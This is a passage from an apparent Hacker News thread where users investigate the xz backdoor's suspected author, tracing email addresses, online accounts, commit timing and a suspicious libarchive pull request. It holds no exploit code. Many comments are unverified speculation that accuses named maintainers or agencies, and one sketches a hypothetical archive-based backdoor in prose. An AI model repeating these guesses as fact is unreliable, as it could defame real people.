(low, moderate, high, critical)     -- Steps to recreate the vulnerability     -- All relevant files (core dumps, build logs, input files, etc.)     +While both options are available, we prefer email.       This project is maintained by a team of volunteers on a reasonable-effort      basis. As such, please give us 90 days to work on a fix before  ``` Seems innocuous, but maybe they were planning further changes. | | --- | --- | --- | | | |  |  | [bombcar](user?id=bombcar) [9 months ago](item?id=39867271)   | [root](#39866326) | [parent](#39867077) | [next](#39870153) [–]  > Seems innocuous, but maybe they were planning further changes. Seems like an attempt to get 90 days of "use" of this vulnerability after discovery. If they only had checked performance before! | | --- | --- | --- | | | |  |  | [hackernudes](user?id=hackernudes) [9 months ago](item?id=39867916)   | [root](#39866326) | [parent](#39867271) | [next](#39870153) [–]  No, they just removed the bullet points about what to include in a report. The 90 days part was in both versions. | | --- | --- | --- | | | |  |  | [meragrin\_](user?id=meragrin_) [9 months ago](item?id=39869081)   | [root](#39866326) | [parent](#39867916) | [next](#39867965) [–]  Yes. An incomplete report allows for dragging out "fixing" the issue longer. | | --- | --- | --- | | | |  |  | [bombcar](user?id=bombcar) [9 months ago](item?id=39867965)   | [root](#39866326) | [parent](#39867916) | [prev](#39869081) | [next](#39870153) [–]  True, but the "talk only to me" part was new, I think. | | --- | --- | --- | | | |  |  | [hughesjj](user?id=hughesjj) [9 months ago](item?id=39903806)   | [root](#39866326) | [parent](#39867965) | [next](#39870153) [–]  They didn't add any content, it was a pure removal commit | | --- | --- | --- | | | |  |  | [mxmlnkn](user?id=mxmlnkn) [9 months ago](item?id=39870153)   | [root](#39866326) | [parent](#39866862) | [prev](#39867077) | [next](#39866902) [–]  The website change reminds me a bit of lbzip2.org [https://github.com/kjn/lbzip2/issues/26#issuecomment-1582645...](https://github.com/kjn/lbzip2/issues/26#issuecomment-1582645633) Although, at the moment, it only seems to be spam. The last commit was 6 years ago, so I guess that's better than a maintainer change... | | --- | --- | --- | | | |  |  | [buildbot](user?id=buildbot) [9 months ago](item?id=39866902)   | [root](#39866326) | [parent](#39866862) | [prev](#39870153) | [next](#39866907) [–]  > tukaani.org has address 5.44.245.25 (seemingly in Finland) Hetzner? | | --- | --- | --- | | | |  |  | [yencabulator](user?id=yencabulator) [9 months ago](item?id=39867825)   | [root](#39866326) | [parent](#39866902) | [next](#39867141) [–]  For what it's worth, tukaani is how you spell toucan (the bird) in Finnish, and Lasse is a common Finnish name; the site being previously hosted in Finland is very plausible. | | --- | --- | --- | | | |  |  | [Stagnant](user?id=Stagnant) [9 months ago](item?id=39868332)   | [root](#39866326) | [parent](#39867825) | [next](#39867141) [–]  Yeah according to their website[0] it looks like majority of the past contributors were Finnish so nothing odd about the hosting provider. On the same page it says that Jia Tan became co-maintainer of xz in 2022. 0: <https://tukaani.org/about.html> | | --- | --- | --- | | | |  |  | [TimWolla](user?id=TimWolla) [9 months ago](item?id=39867141)   | [root](#39866326) | [parent](#39866902) | [prev](#39867825) | [next](#39866907) [–]  No: ```     route:          5.44.240.0/21     descr:          Zoner Oy     origin:         AS201692     mnt-by:         MNT-ZONER     created:        2014-09-03T08:09:00Z     last-modified:  2014-09-03T08:09:00Z     source:         RIPE ``` | | --- | --- | --- | | | |  |  | [whizzter](user?id=whizzter) [9 months ago](item?id=39867407)   | [root](#39866326) | [parent](#39867141) | [next](#39882942) [–]  It's Finnish, Oy is short for "Osake Yhtiö" (share-association, basically a LLC), seems to be registered/hosted at <https://www.zoner.fi/> | | --- | --- | --- | | | |  |  | [jaakl](user?id=jaakl) [9 months ago](item?id=39882415)   | [root](#39866326) | [parent](#39867407) | [next](#39882942) [–]  So probably Suojelupoliisi, Finnish Security and Intelligence Service is behind all this | | --- | --- | --- | | | |  |  | [ancientMariner](user?id=ancientMariner) [9 months ago](item?id=39882942)   | [root](#39866326) | [parent](#39867141) | [prev](#39867407) | [next](#39867174) [–]  Zoner is a Finnish web hosting company, which has a history of providing hosting for Finnish open source projects, and the original maintainer (and most of the original crew) is Finnish as well. Nothing weird here. | | --- | --- | --- | | | |  |  | [buildbot](user?id=buildbot) [9 months ago](item?id=39867174)   | [root](#39866326) | [parent](#39867141) | [prev](#39882942) | [next](#39866907) [–]  Interesting, seems to be a tiny finnish hosting company: <https://www.zoner.fi/english/> | | --- | --- | --- | | | |  |  | [mort96](user?id=mort96) [9 months ago](item?id=39866907)   | [root](#39866326) | [parent](#39866521) | [prev](#39866707) | [next](#39867280) [–]  If the owner of the account is innocent and their account was compromised, it's on them to come out and say that. All signs currently point to the person being a malicious actor, so I'll proceed on that assumption. | | --- | --- | --- | | | |  |  | [londons\_explore](user?id=londons_explore) [9 months ago](item?id=39867176)   | [root](#39866326) | [parent](#39866907) | [next](#39867280) [–]  Does the person exist at all? Maybe they're a persona of a team working at some three letter agency... | | --- | --- | --- | | | |  |  | [Citizen8396](user?id=Citizen8396) [9 months ago](item?id=39869668)   | [root](#39866326) | [parent](#39867176) | [next](#39867386) [–]  Probably not. I did some pattern of life analysis on their email/other identifiers. It looks exactly like when I set up a burner online identity- just enough to get past platform registration, but they didn't care enough to make it look real. For example, their email is only registered to GitHub and Twitter. They haven't even logged into their Google account for almost a year. There's also no history of it being in any data breaches (because they never use it). Burn the witch. | | --- | --- | --- | | | |  |  | [ancientMariner](user?id=ancientMariner) [9 months ago](item?id=39882962)   | [root](#39866326) | [parent](#39869668) | [next](#39964880) [–]  It would be interesting to hear the whole arc of social engineering behind getting access to the repo. Although, as a maintainer of a large-ish OSS project myself, I know that under a lot of burden *any* help will be welcomed with open arms, and I've never really talked about private stuff with any of them. | | --- | --- | --- | | | |  |  | [Ill\_Yam\_689](user?id=Ill_Yam_689) [9 months ago](item?id=39964880)   | [root](#39866326) | [parent](#39869668) | [prev](#39882962) | [next](#39867386) [–]  did you find the Twitter account associated to Jia's email? | | --- | --- | --- | | | |  |  | [Ill\_Yam\_689](user?id=Ill_Yam_689) [9 months ago](item?id=40000126)   | [root](#39866326) | [parent](#39964880) | [next](#39867386) [–]  Found it by myself! <https://twitter.com/JiaT03868010> | | --- | --- | --- | | | |  |  | [bonzini](user?id=bonzini) [9 months ago](item?id=39867386)   | [root](#39866326) | [parent](#39867176) | [prev](#39869668) | [next](#39867280) [–]  Or for some three letter party. | | --- | --- | --- | | | |  |  | [ikmckenz](user?id=ikmckenz) [9 months ago](item?id=39867280)   | [root](#39866326) | [parent](#39866462) | [prev](#39866521) | [next](#39867737) [–]  > The above author seems to be primary contact for xz? They made themselves the primary contact for xz for Google oss-fuzz about one year ago: [https://github.com/google/oss-fuzz/commit/6403e93344476972e9...](https://github.com/google/oss-fuzz/commit/6403e93344476972e908ce17e8244f5c2b957dfd) | | --- | --- | --- | | | |  |  | [bed99](user?id=bed99) [9 months ago](item?id=39867737)   | [root](#39866326) | [parent](#39866462) | [prev](#39867280) | [next](#39866543) [–]  A SourceGraph search like this shows [https://sourcegraph.com/search?q=context:global+JiaT75&patte...](https://sourcegraph.com/search?q=context:global+JiaT75&patternType=keyword&sm=0) - Jia Tan <jiat75@gmail.com> - jiat75 <jiat0218@gmail.com> ``` amap = generate\_author\_map("xz") ```         test_author = amap.get_author_by_name("Jia Cheong Tan")          self.assertEqual(             test_author.names, {"Jia Cheong Tan", "Jia Tan", "jiat75"}          )          self.assertEqual(              test_author.mail_addresses,              {"jiat0218@gmail.com", "jiat75@gmail.com"}          )  ``` ``` | | --- | --- | --- | | | |  |  | [berdario](user?id=berdario) [9 months ago](item?id=39870067)   | [root](#39866326) | [parent](#39867737) | [next](#39869533) [–]  I tried to understand the significance of this (parent maybe implied that they reused a completely fictitious identity generated by some test code), and I think this is benign. That project just includes some metadata about a bunch of sample projects, and it links directly to a mirror of the xz project itself: [https://github.com/se-sic/VaRA-Tool-Suite/blob/982bf9b9cbf64...](https://github.com/se-sic/VaRA-Tool-Suite/blob/982bf9b9cbf646be09987f18b483345804d91b34/varats/varats/projects/c_projects/xz.py#L60) I assume it downloads the project, examines the git history, and the test then ensures that the correct author name and email addresses are recognized. (that said, I haven't checked the rest of the project, so I don't know if the code from xz is then subsequently built, and or if this other project could use that in an unsafe manner) | | --- | --- | --- | | | |  |  | [pryce](user?id=pryce) [9 months ago](item?id=39869533)   | [root](#39866326) | [parent](#39867737) | [prev](#39870067) | [next](#39888515) [–]  additionally, even though the commit messages they've made are mostly plain, there may be features of their commit messages that could provide leads, such as his using what looks like a very obscure racist joke of referring to a gitignore file as a 'gitnigore'. There's barely a handful of people on the whole planet making this 'joke'. | | --- | --- | --- | | | |  |  | [berdario](user?id=berdario) [9 months ago](item?id=39870078)   | [root](#39866326) | [parent](#39869533) | [next](#39871424) [–]  Can you point to where you saw that racist joke? I don't see anything at [https://sourcegraph.com/search?q=context:global+author:jiat0...](https://sourcegraph.com/search?q=context:global+author:jiat0218%40gmail.com+gitnigore&patternType=keyword&sm=0) | | --- | --- | --- | | | |  |  | [pryce](user?id=pryce) [9 months ago](item?id=39870136)   | [root](#39866326) | [parent](#39870078) | [next](#39871424) [–]  first commit made in one of JiaT75's other repos <https://github.com/JiaT75/STest/commits/master/> | | --- | --- | --- | | | |  |  | [berdario](user?id=berdario) [9 months ago](item?id=39870596)   | [root](#39866326) | [parent](#39870136) | [next](#39871424) [–]  Thank you. If you wouldn't have explained the background, I totally would've thought that this is just an innocent typo. (I still think it's like... 60% a typo? don't know) Anyhow, other people called the CCing of JiaT75 by Lasse suspicious: <https://news.ycombinator.com/item?id=39867593> [https://lore.kernel.org/lkml/20240320183846.19475-2-lasse.co...](https://lore.kernel.org/lkml/20240320183846.19475-2-lasse.collin%40tukaani.org/) Someone pointed out the "mental health issues" and "some other things" <https://news.ycombinator.com/item?id=39868881> [https://www.mail-archive.com/xz-devel@tukaani.org/msg00567.h...](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00567.html) Lasse is of course a Nordic name, and the whole project has a finnish name and hosting <https://news.ycombinator.com/item?id=39866902> If I wanted to go rogue and insert a backdoor in a project of mine, I'd probably create a new sockpuppet account and hand over management of the project to them. The above is worringly compatible with this hypothesis. OTOH, JiaT75 did not reuse the existing hosting provider, but rather switched the site to github.io and uploaded there old tarballs: [https://github.com/tukaani-project/tukaani-project.github.io...](https://github.com/tukaani-project/tukaani-project.github.io/commit/071a8acf097e11b659f6d7eb0f3b2e5e8934de0e) If JiaT75 is an old-timer in the project, wouldn't they have kept using the same hosting infra? There are also some other grim possibilities: someone forced Lasse to hand over the project (violence or blackmailing? as farfetched as that sounds)... or maybe stole Lasse devices (and identity?) and now Lasse is incapacitated? Or maybe it's just some other fellow scandinavian who pretended to be chinese and got Lasse's trust. In which case I wish Lasse all the best, and hope they'll be able to clear their name. Is the same person sockpuppeting Hans Jansen? It's amusing (but unsurprising) that they are using both german-sounding and chinese-sounding identities. That said, I don't think it's unreasonable to think that Lasse genuinely trusted JiaT75, genuinely believed that the ifunc stuff was reasonable (it probably isn't: <https://news.ycombinator.com/item?id=39869538> ) and handed over the project to them. And at the end of the day, the only thing linking JiaT75 to a nordic identity is a nordic racist joke which could well be a typo. People already checked the timezone of the commits, but I wonder if anyone has already checked the time-of-day of those commits... does it actually match the working hours that a person genuinely living (and sleeping) in China would follow? (of course, that's also easy to manipulate, but maybe they could've slip up) Anyhow, I guess that security folks at Microsoft and Google (because of JiaT75 email account) are probably going to cooperate with authorities on trying to pin down the identity of JiaT75 (which might not be very useful, depending on where they live). | | --- | --- | --- | | | |  |  | [berdario](user?id=berdario) [9 months ago](item?id=39870925)   | [root](#39866326) | [parent](#39870596) | [next](#39871218) [–]  > does it actually match the working hours that a person genuinely living (and sleeping) in China would follow? No, it doesn't: [https://play.clickhouse.com/play?user=play#U0VMRUNUIHRvSG91c...](https://play.clickhouse.com/play?user=play#U0VMRUNUIHRvSG91cihjcmVhdGVkX2F0KSBBUyBob3VyLCBjb3VudCgqKSBGUk9NIGdpdGh1Yl9ldmVudHMgV0hFUkUgYWN0b3JfbG9naW49J0ppYVQ3NScgR1JPVVAgQlkgaG91ciBPUkRFUiBCWSBob3Vy) The vast majority of their Github interactions are between 12.00 UTC and 18.00 UTC | | --- | --- | --- | | | |  |  | [junon](user?id=junon) [9 months ago](item?id=39871218)   | [root](#39866326) | [parent](#39870596) | [prev](#39870925) | [next](#39871424) [–]  It's worth mentioning Lasse is still online in the Libera chat room, idling. Nothing's been said. | | --- | --- | --- | | | |  |  | [berdario](user?id=berdario) [9 months ago](item?id=39884366)   | [root](#39866326) | [parent](#39871218) | [next](#39871424) [–]  From elsewhere in the comments: <https://news.ycombinator.com/item?id=39874621> > He came on IRC, he seemed ok. He did some cleanup of access and signed off for easter. | | --- | --- | --- | | | |  |  | [Bulat\_Ziganshin](user?id=Bulat_Ziganshin) [9 months ago](item?id=39871424)   | [root](#39866326) | [parent](#39869533) | [prev](#39870078) | [next](#39881512) [–]  i think it's American trauma. outside of the Western hemisphere, sexist and racist jokes are just jokes | | --- | --- | --- | | | |  |  | [AnarchismIsCool](user?id=AnarchismIsCool) [9 months ago](item?id=39881512)   | [root](#39866326) | [parent](#39869533) | [prev](#39871424) | [next](#39888515) [–]  Pretty sure this is just a typo... | | --- | --- | --- | | | |  |  | [KomoD](user?id=KomoD) [9 months ago](item?id=39888515)   | [root](#39866326) | [parent](#39867737) | [prev](#39869533) | [next](#39866543) [–]  Interesting thing about this jiat75@gmail.com email is that it seems to not exist? The google account: "Couldn't find your Google Account" The email: "50 5.1.1 The email account that you tried to reach does not exist" But then when you try to register it says it's taken. Was it disabled? | | --- | --- | --- | | | |  |  | [bed99](user?id=bed99) [9 months ago](item?id=39890160)   | [root](#39866326) | [parent](#39888515) | [next](#39890728) [–]  I'd say at this point all major tech companies, ISPs and authorities should have more enough information and disabling and freezing their accounts would be the first step. | | --- | --- | --- | | | |  |  | [Flame](user?id=Flame) [9 months ago](item?id=39890728)   | [root](#39866326) | [parent](#39888515) | [prev](#39890160) | [next](#39866543) [–]  This can happen if you delete your old gmail account. Source: I deleted a gmail account I shouldn't have years ago. It will say taken if it previously existed, and was deleted. | | --- | --- | --- | | | |  |  | [soraminazuki](user?id=soraminazuki) [9 months ago](item?id=39866543)   | [root](#39866326) | [parent](#39866462) | [prev](#39867737) | [next](#39867042) [–]  Oh no, not libarchive! GitHub search shows 6 pull requests were merged back in 2021. [https://github.com/search?q=repo%3Alibarchive%2Flibarchive+j...](https://github.com/search?q=repo%3Alibarchive%2Flibarchive+jiat75&type=commits) It does look innocent enough though. Let's hope there's no unicode trickery involved... | | --- | --- | --- | | | |  |  | [steelframe](user?id=steelframe) [9 months ago](item?id=39866715)   | [root](#39866326) | [parent](#39866543) | [next](#39867042) [–]  Maybe not. They removed safe\_fprintf() here and replaced it with the (unsafe) fprintf(). [https://github.com/libarchive/libarchive/commit/e37efc16c866...](https://github.com/libarchive/libarchive/commit/e37efc16c8665f405182dd77eb1bbb32376f5484) | | --- | --- | --- | | | |  |  | [dchest](user?id=dchest) [9 months ago](item?id=39867392)   | [root](#39866326) | [parent](#39866715) | [next](#39866839) [–]  That seems to be fine. safe\_fprintf() takes care of non-printable characters. It's used for archive\_entry\_pathname, which can contain them, while "unsafe" fprintf is used to print out archive\_error\_string, which is a library-provided error string, and strerror(errno) from libc. | | --- | --- | --- | | | |  |  | [mbauman](user?id=mbauman) [9 months ago](item?id=39867873)   | [root](#39866326) | [parent](#39867392) | [next](#39868419) [–]  We know there's long-cons in action here, though. This PR needn't be the exploit. It needn't be anywhere \_temporally\_ close to the exploit. It could just be laying groundwork for later pull requests by potentially different accounts. | | --- | --- | --- | | | |  |  | [datenwolf](user?id=datenwolf) [9 months ago](item?id=39868312)   | [root](#39866326) | [parent](#39867873) | [next](#39868419) [–]  Exactly. If we assume the backdoor via liblzma as a template, this could be a ploy to hook/detour both fprintf and strerror in a similar way. Get it to diffuse into systems that rely on libarchive in their package managers. When the trap is in place deploy a crafted package file that appears invalid on the surface level triggers this trap. In that moment fetch the payload from the (already opened) archive file descriptor, execute it, but also patch the internal state of libarchive so that it will process the rest of the archive file as if nothing happened, and the desired outcome also appearing in the system. | | --- | --- | --- | | | |  |  | [zrm](user?id=zrm) [9 months ago](item?id=39868419)   | [root](#39866326) | [parent](#39867392) | [prev](#39867873) | [next](#39866839) [–]  Assuming there isn't another commit somewhere modifying a library-provided error string or anything returned by libc. There is all kinds of mischief to be had there, which may or may not have already happened, e.g. now you do some i18n and introduce Unicode shenanigans. | | --- | --- | --- | | | |  |  | [buildbot](user?id=buildbot) [9 months ago](item?id=39866839)   | [root](#39866326) | [parent](#39866715) | [prev](#39867392) | [next](#39866874) [–]  If libarchive is also backdoored, would that allow specifically crafted http gzip encoded responses to do bad things? | | --- | --- | --- | | | |  |  | [duskwuff](user?id=duskwuff) [9 months ago](item?id=39868901)   | [root](#39866326) | [parent](#39866839) | [next](#39867117) [–]  No. There's no good reason HTTP response decoding would ever be implemented in terms of libarchive; using libz directly is simpler and supports some use cases (like streaming reads) which libarchive doesn't. | | --- | --- | --- | | | |  |  | [nicolas\_17](user?id=nicolas_17) [9 months ago](item?id=39867117)   | [root](#39866326) | [parent](#39866839) | [prev](#39868901) | [next](#39866874) [–]  What software is using libarchive to decode HTTP responses? | | --- | --- | --- | | | |  |  | [mattbee](user?id=mattbee) [9 months ago](item?id=39870084)   | [root](#39866326) | [parent](#39867117) | [next](#39869354) [–]  Well for one, the Powershell script I just wrote to build all the 3rd-party library dependencies for a video game. tar.exe was added to Windows this January, sourced from libarchive: [https://learn.microsoft.com/en-us/virtualization/community/t...](https://learn.microsoft.com/en-us/virtualization/community/team-blog/2017/20171219-tar-and-curl-come-to-windows) Unlike the GNU tar I'm used to, it's actually a "full fat" command line archiving tool, compressing & decompressing zip, xz, bz2 on the command-line - really handy :-O | | --- | --- | --- | | | |  |  | [giantrobot](user?id=giantrobot) [9 months ago](item?id=39869354)   | [root](#39866326) | [parent](#39867117) | [prev](#39870084) | [next](#39867189) [–]  FreeBSD's archive tools are built on top of libarchive IIRC. Not sure about the other BSDs. | | --- | --- | --- | | | |  |  | [buildbot](user?id=buildbot) [9 months ago](item?id=39867189)   | [root](#39866326) | [parent](#39867117) | [prev](#39869354) | [next](#39866874) [–]  I don't know, way outside my domain. Possibly none I guess? | | --- | --- | --- | | | |  |  | [billyhoffman](user?id=billyhoffman) [9 months ago](item?id=39866874)   | [root](#39866326) | [parent](#39866715) | [prev](#39866839) | [next](#39867042) [–]  EDIT: Ahh, I was wrong and missed the addition of "strerror" The PR is pretty devious. JiaT75 claims is "Added the error text when printing out warning and errors in bsdtar when untaring. Previously, there were cryptic error messages" and cites this as fixing a previous issue. <https://github.com/libarchive/libarchive/pull/1609> However it doesn't actually do that! The PR literally removes a new line between 2 arguments on the first `safe\_fprintf()` call, and converts the `safe\_fprintf()` to unsafe direct calls to `fprintf()`. In all cases, the arguments to these functions are exactly the same! So it doesn't actually make the error messages any different, it doesn't actually solve the issue it references. And the maintainer accepted it with no comments! | | --- | --- | --- | | | |  |  | [londons\_explore](user?id=londons_explore) [9 months ago](item?id=39866962)   | [root](#39866326) | [parent](#39866874) | [next](#39866947) [–]  reread it... It does remove the safe prefixes... But it also adds one print statement to "strerror()", which could plausibly give better explanations for the error code... The only suspicious thing here is the lack for safe\_ prefix (and the potential for the strerror() function to already be backdoored elsewhere in another commit) | | --- | --- | --- | | | |  |  | [zb3](user?id=zb3) [9 months ago](item?id=39866947)   | [root](#39866326) | [parent](#39866874) | [prev](#39866962) | [next](#39867042) [–]  But I see the "strerror" call is added | | --- | --- | --- | | | |  |  | [davexunit](user?id=davexunit) [9 months ago](item?id=39867042)   | [root](#39866326) | [parent](#39866462) | [prev](#39866543) | [next](#39867772) [–]  JiaT75 also has commits in wasmtime according to [https://hachyderm.io/@joeyh/112180082372196735](https://hachyderm.io/%40joeyh/112180082372196735) | | --- | --- | --- | | | |  |  | [mintplant](user?id=mintplant) [9 months ago](item?id=39867283)   | [root](#39866326) | [parent](#39867042) | [next](#39867238) [–]  Just a documentation change, fortunately: [https://github.com/bytecodealliance/wasmtime/commits?author=...](https://github.com/bytecodealliance/wasmtime/commits?author=JiaT75) They've submitted little documentation tweaks to other projects, too; for example: [https://learn.microsoft.com/en-us/cpp/overview/whats-new-cpp...](https://learn.microsoft.com/en-us/cpp/overview/whats-new-cpp-docs?view=msvc-170#community-contributors) I don't know whether this is a formerly-legitimate open source contributor who went rogue, or a deep-cover persona spreading innocuous-looking documentation changes around to other projects as a smokescreen. | | --- | --- | --- | | | |  |  | [bombcar](user?id=bombcar) [9 months ago](item?id=39868617)   | [root](#39866326) | [parent](#39867283) | [next](#39869116) [–]  Minor documentation change PRs is a well known tactic used to make your GitHub profile look better (especially to potential employers). He could be doing the same thing for other reasons; nobody really digs into anything very deep so I could see someone handing over co-maintenance to a project based on a decent looking Github graph and some reasonability. | | --- | --- | --- | | | |  |  | [mysidia](user?id=mysidia) [9 months ago](item?id=39869116)   | [root](#39866326) | [parent](#39867283) | [prev](#39868617) | [next](#39867238) [–]  Consider the possibility those type of submissions were part of the adversary's strategy in order to make their account appear more legitimate rather than appearing out of nowhere wanting to become the maintainer of some project. | | --- | --- | --- | | | |  |  | [pinko](user?id=pinko) [9 months ago](item?id=39867238)   | [root](#39866326) | [parent](#39867042) | [prev](#39867283) | [next](#39867772) [–]  per [https://hachyderm.io/@bjorn3/112180226784517099](https://hachyderm.io/%40bjorn3/112180226784517099), "The only contribution by them to Wasmtime is a doc change. No actual code or binary blobs have been changed by them." | | --- | --- | --- | | | |  |  | [metzmanj](user?id=metzmanj) [9 months ago](item?id=39867772)   | [root](#39866326) | [parent](#39866462) | [prev](#39867042) | [next](#39869795) [–]  >Woha, is this legit or some sort of scam on Google in some way?: I work on OSS-Fuzz. As far as I can tell, the author's PRs do not compromise OSS-Fuzz in any way. OSS-Fuzz doesn't trust user code for this very reason. | | --- | --- | --- | | | |  |  | [packetlost](user?id=packetlost) [9 months ago](item?id=39868117)   | [root](#39866326) | [parent](#39867772) | [next](#39869795) [–]  It looks more like they disabled a feature of oss-fuzz that would've caught the exploit, no? | | --- | --- | --- | | | |  |  | [metzmanj](user?id=metzmanj) [9 months ago](item?id=39868391)   | [root](#39866326) | [parent](#39868117) | [next](#39869795) [–]  That's what people are saying though I haven't had the chance to look into this myself. Fuzzing isn't really the best tool for catching bugs the maintainer intentionally inserted though. | | --- | --- | --- | | | |  |  | [bombcar](user?id=bombcar) [9 months ago](item?id=39868634)   | [root](#39866326) | [parent](#39868391) | [next](#39869795) [–]  It's more likely that fuzzing would blow up on new code and they wanted an excuse to remove it. After all, if it hadn't had a performance regression (someone could submit a PR fixing whatever slowed it down, heh) it still wouldn't be known. | | --- | --- | --- | | | |  |  | [jnxx](user?id=jnxx) [9 months ago](item?id=39869795)   | [root](#39866326) | [parent](#39866462) | [prev](#39867772) | [next](#39866803) [–]  There is also a variety of new, parallelized implementations of compression algorithms which would be good to have a close look at. Bugs causing undefined behaviour in parallel code are notoriously hard to see, and the parallel versions (which are actually much faster) could be take the place of well-established programs which have earned a lot of trust. | | --- | --- | --- | | | |  |  | [Zetobal](user?id=Zetobal) [9 months ago](item?id=39866803)   | [root](#39866326) | [parent](#39866462) | [prev](#39869795) | [next](#39866509) [–]  That looks like a repo that would sound alarms if you look at it from a security standpoint. | | --- | --- | --- | | | |  |  | [formerly\_proven](user?id=formerly_proven) [9 months ago](item?id=39866509)   | [root](#39866326) | [parent](#39866351) | [prev](#39866462) | [next](#39867446) [–]  Well that account also did most of the releases since 5.4.0. | | --- | --- | --- | | | |  |  | [alwaysbeconsing](user?id=alwaysbeconsing) [9 months ago](item?id=39867431)   | [root](#39866326) | [parent](#39866509) | [next](#39867446) [–]  +1 Can see from project homepage [http://web.archive.org/web/20240329165859/https://xz.tukaani...](http://web.archive.org/web/20240329165859/https%3A//xz.tukaani.org/xz-utils/) they have some release responsibility from 5.2.12. > Versions 5.2.12, 5.4.3 and later have been signed with Jia Tan's OpenPGP key . The older releases have been signed with Lasse Collin's OpenPGP key . It must be assume that before acquiring that privilege, they also contributed code to project. Probably most was to establish respectable record. Still could be malicious code going back someways. | | --- | --- | --- | | | |  |  | [0x0](user?id=0x0) [9 months ago](item?id=39870187)   | [root](#39866326) | [parent](#39867431) | [next](#39867446) [–]  Looks like the Jia Tan OpenPGP key was replaced a few months ago as well: [https://github.com/tukaani-project/tukaani-project.github.io...](https://github.com/tukaani-project/tukaani-project.github.io/commit/76f58f1e14e44d69f712841090d331437c187b30) | | --- | --- | --- | | | |  |  | [wpietri](user?id=wpietri) [9 months ago](item?id=39867446)   | [parent](#39866326) | [prev](#39866351) | [next](#39867033) [–]  I get why people are focusing on this bad actor. But the question that interests me more: how many other apparent individuals fit the profile that this person presented before caught? | | --- | --- | --- | | | |  |  | [Phenylacetyl](user?id=Phenylacetyl) [9 months ago](item?id=39870327)   | [root](#39866326) | [parent](#39867446) | [next](#39867033) [–]  Apparently, many. It looks like gettext may be containing a part of their attack infrastructure. [https://github.com/microsoft/vcpkg/pull/37199#pullrequestrev...](https://github.com/microsoft/vcpkg/pull/37199#pullrequestreview-1924053615) [https://github.com/microsoft/vcpkg/pull/37356/files#diff-e16...](https://github.com/microsoft/vcpkg/pull/37356/files#diff-e16d9c519b2d76f862abe4fe02d40f84e8daa712f7e08b616df3f16376c82431) <https://github.com/MonicaLiu0311> | | --- | --- | --- | | | |  |  | [collinfunk](user?id=collinfunk) [9 months ago](item?id=39870895)   | [root](#39866326) | [parent](#39870327) | [next](#39867033) [–]  Are you referencing the '-unsafe' suffix in the second link? That is not something to worry about. This is from Gnulib, which is used by Gettext and other GNU projects. Using 'setlocale (0, NULL)' is not thread-safe on all platforms. Gnulib has modules to work around this, but not all projects want the extra locking. Hence the name '-unsafe'. :) See: [https://lists.gnu.org/archive/html/bug-gnulib/2024-02/msg001...](https://lists.gnu.org/archive/html/bug-gnulib/2024-02/msg00127.html) | | --- | --- | --- | | | |  |  | [everybackdoor](user?id=everybackdoor) [9 months ago](item?id=39873074)   | [root](#39866326) | [parent](#39870895) | [next](#39867033) [–]  They may be right: <https://git.alpinelinux.org/aports/log/main/gettext> Timeline matches and there is a sudden switch of maintainer. And they add dependency to xz! | | --- | --- | --- | | | |  |  | [kaathewise](user?id=kaathewise) [9 months ago](item?id=39873923)   | [root](#39866326) | [parent](#39873074) | [next](#39867033) [–]  psykose was a prolific contributor to Alpine's aports, with thousands of commits over the past few years[0]. So, I doubt They're involved. [0]: <https://git.alpinelinux.org/aports/stats/?period=y&ofs=10> | | --- | --- | --- | | | |  |  | [everybackdoor](user?id=everybackdoor) [9 months ago](item?id=39874681)   | [root](#39866326) | [parent](#39873923) | [next](#39867033) [–]  JiaT75 was also a prolific contributor to xz over the past few years, so your assumptions are generally invalid at this point. | | --- | --- | --- | | | |  |  | [5kg](user?id=5kg) [9 months ago](item?id=39867033)   | [parent](#39866326) | [prev](#39867446) | [next](#39881491) [–]  There is zero web presence for this person and associated email address. Looks more likely a fake identity than compromised account. | | --- | --- | --- | | | |  |  | [mrb](user?id=mrb) [9 months ago](item?id=39867322)   | [root](#39866326) | [parent](#39867033) | [next](#39869014) [–]  Actually the "jiat0218" user part in his email address jiat0218@gmail.com has a bunch of matches on Taiwanese sites: <https://char.tw/blog/post/24397301> <https://forum.babyhome.com.tw/topic/167439> <https://bmwcct.com.tw/forums/thread1828.html> | | --- | --- | --- | | | |  |  | [5kg](user?id=5kg) [9 months ago](item?id=39867425)   | [root](#39866326) | [parent](#39867322) | [next](#39871347) [–]  I think it's just a coincidence. - All the posts are from 2004/2006. - "jiat" can be abbreviation for many common Chinese names. | | --- | --- | --- | | | |  |  | [mrb](user?id=mrb) [9 months ago](item?id=39867569)   | [root](#39866326) | [parent](#39867425) | [next](#39871347) [–]  I agree, probably a coincidence. Just wanted to point out we can, actually, find the username online. | | --- | --- | --- | | | |  |  | [bruno-miguel](user?id=bruno-miguel) [9 months ago](item?id=39871347)   | [root](#39866326) | [parent](#39867322) | [prev](#39867425) | [next](#39869014) [–]  It might just be a coincidence, but the same username from that gmail account also appears to have a Proton Mail address | | --- | --- | --- | | | |  |  | [Ill\_Yam\_689](user?id=Ill_Yam_689) [9 months ago](item?id=39974919)   | [root](#39866326) | [parent](#39871347) | [next](#39869014) [–]  I think it's not a coincidence: Hans Jansen (hansjansen162@outlook.com) has a matching account on Proton mail too (hansjansen162@proton.me). Furthermore, the Outlook account is configured as recovery e-mail for the Proton account. | | --- | --- | --- | | | |  |  | [junon](user?id=junon) [9 months ago](item?id=39869014)   | [root](#39866326) | [parent](#39867033) | [prev](#39867322) | [next](#39868516) [–]  This is all I can find on them. ```     carrd.co jiat0218@gmail.com business https://jiat0218@gmail.com.carrd.co     eBay JiaT75 shopping https://www.ebay.com/usr/JiaT75     giters jiat0218 coding https://giters.com/jiat0218     giters JiaT75 coding https://giters.com/JiaT75     GitHub jiat0218 coding https://github.com/jiat0218     GitHub JiaT75 coding https://github.com/JiaT75     Mastodon-meow.so.. jiat0218@gmail.com social https://meow.social/@jiat0218@gmail.com  ``` Beyond that, nothing surefire. (This is all publicly queryable information, if anyone is curious). | | --- | --- | --- | | | |  |  | [janc\_](user?id=janc_) [9 months ago](item?id=39871275)   | [root](#39866326) | [parent](#39869014) | [next](#39871416) [–]  JiaT75 also used "jiatan" on Libera.Chat using a Singapore IP address (possibly a proxy/VPN). | | --- | --- | --- | | | |  |  | [Zenul\_Abidin](user?id=Zenul_Abidin) [9 months ago](item?id=39871416)   | [root](#39866326) | [parent](#39869014) | [prev](#39871275) | [next](#39868516) [–]  Where did you gather this information from? | | --- | --- | --- | | | |  |  | [johnny22](user?id=johnny22) [9 months ago](item?id=39868516)   | [root](#39866326) | [parent](#39867033) | [prev](#39869014) | [next](#39904009) [–]  I've never had a web presencse for my associated emails due to wanting to avoid 